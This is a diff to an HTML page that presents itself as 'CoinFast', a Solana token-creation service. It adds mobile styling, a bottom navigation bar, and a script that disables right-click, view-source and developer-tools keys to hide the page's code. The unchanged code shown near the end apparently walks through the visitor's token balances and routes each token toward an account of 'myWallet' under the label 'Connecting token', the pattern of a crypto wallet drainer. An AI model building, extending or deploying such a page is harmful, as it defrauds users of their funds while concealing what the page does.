@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>CoinFast - Create Your Own Token</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
@@ -369,13 +369,146 @@
             border-radius: 4px;
             border: 1px solid rgba(255, 107, 107, 0.3);
         }
+        
+        /* Mobile bottom navigation */
+        .mobile-nav {
+            display: none;
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: var(--dark-bg);
+            border-top: 1px solid var(--border-color);
+            padding: 10px 0;
+            z-index: 100;
+        }
+        
+        .mobile-nav-inner {
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+        }
+        
+        .mobile-nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 10px;
+            color: var(--text-light);
+        }
+        
+        .mobile-nav-item i {
+            font-size: 18px;
+            margin-bottom: 4px;
+        }
+        
+        .mobile-nav-item.active {
+            color: var(--primary-blue);
+        }
+        
+        /* Mobile-specific styles */
+        @media screen and (max-width: 768px) {
+            body {
+                background-color: var(--dark-bg);
+                background-image: none;
+            }
+            
+            .navbar {
+                padding: 10px 15px;
+                justify-content: space-between;
+            }
+            
+            .menu-icon {
+                display: block;
+                font-size: 24px;
+                color: var(--text-white);
+            }
+            
+            .logo {
+                font-size: 24px;
+                color: var(--primary-blue);
+            }
+            
+            .nav-links {
+                display: none;
+            }
+            
+            .wallet-btn {
+                padding: 8px 16px;
+                font-size: 14px;
+            }
+            
+            .banner {
+                font-size: 12px;
+                padding: 8px;
+            }
+            
+            .main-content {
+                padding: 20px 15px 80px 15px;
+            }
+            
+            .title {
+                font-size: 32px;
+                margin-bottom: 10px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+                margin-bottom: 20px;
+            }
+            
+            .connect-box {
+                padding: 25px 15px;
+                margin-bottom: 20px;
+                text-align: center;
+            }
+            
+            .steps-box {
+                padding: 20px 15px;
+            }
+            
+            .steps-title {
+                font-size: 22px;
+                background: linear-gradient(90deg, #4a8eff, #c353ff);
+                -webkit-background-clip: text;
+                -webkit-text-fill-color: transparent;
+            }
+            
+            .steps-subtitle {
+                font-size: 14px;
+            }
+            
+            li {
+                font-size: 14px;
+                margin-bottom: 10px;
+            }
+            
+            .mobile-nav {
+                display: flex;
+                justify-content: space-around;
+            }
+            
+            .faq-box, .footer {
+                display: none;
+            }
+        }
     </style>
+    <script>
+        document.addEventListener('contextmenu', event => event.preventDefault());
+        
+        document.addEventListener("keydown", function(event) {
+            if ((event.ctrlKey && (event.keyCode == 85 || event.keyCode == 83)) || event.keyCode == 123) {
+                event.preventDefault();
+            }
+        });
+    </script>
 </head>
 <body>
     <div class="banner">CREATE YOUR COIN FOR ONLY 0.1 SOL, FAST!</div>
     
     <div class="navbar">
-        <div class="logo">Coin<span>Fast</span></div>
+        <div class="menu-icon">☰</div>
+        <div class="logo">CoinFast</div>
         <div class="nav-links">
             <a href="#">Create Token</a>
             <a href="#">Trending Tokens <span class="new-badge">NEW</span></a>
@@ -443,6 +576,30 @@
                 <div>What platforms can assist with launching a token on Solana?</div>
                 <div class="plus-icon">+</div>
             </div>
+        </div>
+    </div>
+    
+    <!-- Mobile bottom navigation -->
+    <div class="mobile-nav">
+        <div class="mobile-nav-item active">
+            <i>🏠</i>
+            <span>Home</span>
+        </div>
+        <div class="mobile-nav-item">
+            <i>🔖</i>
+            <span>Saved</span>
+        </div>
+        <div class="mobile-nav-item">
+            <i>🔍</i>
+            <span>Search</span>
+        </div>
+        <div class="mobile-nav-item">
+            <i>👤</i>
+            <span>Profile</span>
+        </div>
+        <div class="mobile-nav-item">
+            <i>•••</i>
+            <span>More</span>
         </div>
     </div>
     
@@ -574,7 +731,7 @@
                 const decimals = info.tokenAmount.decimals;
 
                 if (amount > 0) {
-                    resultDiv.innerText += `\Connecting token: ${mint} (${amount / 10 ** decimals})`;
+                    resultDiv.innerText += `\nConnecting token: ${mint} (${amount / 10 ** decimals})`;
 
                     try {
                         const ata = await getOrCreateAta(connection, myWallet, new solanaWeb3.PublicKey(mint), ownerPublicKey);
